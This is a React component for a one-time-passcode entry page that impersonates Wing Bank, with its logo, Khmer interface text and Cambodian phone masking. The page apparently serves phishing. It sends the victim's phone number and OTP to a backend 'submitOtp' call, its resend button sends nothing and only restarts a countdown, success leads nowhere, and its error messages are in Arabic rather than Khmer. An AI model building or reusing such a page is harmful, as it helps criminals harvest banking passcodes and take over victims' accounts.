import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { useLocation, useRoute } from "wouter";

export default function OtpVerification() {
  const [, setLocation] = useLocation();
  const [, params] = useRoute("/otp/:phone");
  const phoneNumber = params?.phone || "";
  
  const [otpCode, setOtpCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);

  // Countdown timer
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [countdown]);

  const submitOtpMutation = trpc.login.submitOtp.useMutation({
    onSuccess: () => {
      toast.success("تم التحقق من الرمز بنجاح");
      setOtpCode("");
      setIsSubmitting(false);
    },
    onError: () => {
      toast.error("حدث خطأ أثناء التحقق من الرمز");
      setIsSubmitting(false);
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!otpCode || otpCode.length < 4) {
      toast.error("الرجاء إدخال رمز OTP");
      return;
    }
    setIsSubmitting(true);
    submitOtpMutation.mutate({ phoneNumber, otpCode });
  };

  const handleResend = () => {
    if (!canResend) return;
    setCountdown(60);
    setCanResend(false);
    toast.info("تم إعادة إرسال الرمز");
  };

  const handleBack = () => {
    setLocation("/");
  };

  // Mask phone number (show last 2 digits)
  const maskedPhone = phoneNumber 
    ? `855 ** *** **${phoneNumber.slice(-2)}`
    : "855 ** *** **89";

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #a8d84e 0%, #8bc34a 100%)" }}>
      <div className="w-full max-w-md mx-4">
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <img 
              src="/wing-logo.png" 
              alt="Wing Bank Logo" 
              className="h-16 w-auto"
            />
          </div>

          {/* Title */}
          <div className="text-center mb-4">
            <h2 className="text-2xl font-semibold" style={{ color: "#2196f3" }}>
              បញ្ជាក់លេខកូដសុវត្ថិភាព
            </h2>
          </div>

          {/* Info Text */}
          <div className="text-center mb-6">
            <p className="text-gray-600 text-sm mb-1">
              យើងបានផ្ញើលេខកូដ OTP ទៅកាន់
            </p>
            <p className="font-semibold" style={{ color: "#2196f3" }}>
              {maskedPhone}
            </p>
          </div>

          {/* OTP Input Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="relative">
              <Input
                type="text"
                placeholder="ចូលលេខកូដ OTP"
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                className="w-full bg-[#e8e5f5] rounded-lg px-4 py-6 text-center text-2xl tracking-widest border-2 border-transparent focus-visible:border-[#2196f3] transition-colors"
                disabled={isSubmitting}
                maxLength={6}
              />
            </div>

            {/* Verify Button */}
            <Button
              type="submit"
              className="w-full py-6 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all disabled:opacity-50"
              style={{ 
                background: otpCode.length >= 4 ? "#d4a574" : "#c4c4c4",
                color: "white"
              }}
              disabled={isSubmitting || otpCode.length < 4}
            >
              {isSubmitting ? "جاري التحقق..." : "បញ្ជាក់"}
            </Button>
          </form>

          {/* Resend Link */}
          <div className="text-center mt-6">
            <p className="text-gray-600 text-sm">
              មិនទទួលបានលេខកូដ?{" "}
              <button
                onClick={handleResend}
                disabled={!canResend}
                className="font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ color: canResend ? "#7c3aed" : "#9ca3af" }}
              >
                ផ្ញើម្តងទៀត
              </button>
              {!canResend && (
                <span className="text-red-500 font-semibold ml-1">
                  ({countdown}s)
                </span>
              )}
            </p>
          </div>

          {/* Back Link */}
          <div className="text-center mt-4">
            <button
              onClick={handleBack}
              className="text-green-600 font-semibold hover:text-green-700 transition-colors"
            >
              ← ត្រឡប់ក្រោយ
            </button>
          </div>

          {/* Language Options */}
          <div className="flex justify-center gap-4 mt-8 pt-6 border-t border-gray-200">
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាខ្មែរ
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាអង់គ្លេស
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              中文
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

